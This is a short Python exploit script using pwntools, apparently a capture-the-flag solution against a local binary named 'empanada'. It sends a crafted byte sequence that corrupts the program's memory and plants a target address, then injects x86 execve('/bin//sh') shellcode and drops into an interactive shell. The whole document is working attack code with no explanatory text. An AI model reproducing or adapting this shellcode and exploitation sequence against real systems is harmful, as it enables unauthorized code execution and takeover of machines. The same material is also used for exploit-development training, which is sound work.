from pwn import *

s = process("/root/empanada")

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
shell = 0x3133704c 

raw_input("ida")
s.send(p8(0x80 +9 + 0x20))
s.send(p8(16)*9)
s.send(p8(12))
s.send(p8(16)*12)

s.send(p8(0x80 +13 + 0x20))
s.send(p8(16)*2+p32(shell)+'a'*7)
s.send(p8(8))
s.send(p8(16)*8)


s.send(p8(0x80 + 10))             #all_free
s.send(p8(0xfe)+'a'*9)

s.send(p8(0x80 +4))
s.send(p8(96)*4)

s.send(p8(0x80 + 31))             
s.send(p8(0xfe)+shellcode+'a'*5)

s.interactive()